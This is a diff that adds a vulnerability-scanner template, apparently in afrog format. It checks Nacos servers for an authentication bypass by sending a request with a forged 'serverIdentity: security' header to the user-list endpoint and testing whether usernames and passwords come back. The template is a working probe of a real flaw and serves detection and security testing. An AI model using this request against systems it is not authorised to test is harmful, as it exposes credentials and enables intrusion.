@@ -1,0 +1,21 @@
+id: nacos-serveridentity-bypass
+
+info:
+  name: Nacos ServerIdentity Authentication Bypass
+  author: zan8in
+  severity: high
+  verified: true
+  reference:
+    - https://github.com/MrWQ/vulnerability-paper/blob/55e4dca8b537b93c6b90008af2f7eddd68271f2c/bugs/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E8%BF%87%E7%9A%84%20Nacos.md
+  tags: nacos,bypass
+  created: 2023/07/14
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /nacos/v1/auth/users?pageNo=1&pageSize=1&search=accurate&accessToken=
+      headers:
+        serverIdentity: security
+    expression: response.status == 200 && response.body.bcontains(b'"username":') && response.body.bcontains(b'"password":') && response.headers["content-type"].contains('application/json')
+expression: r0()
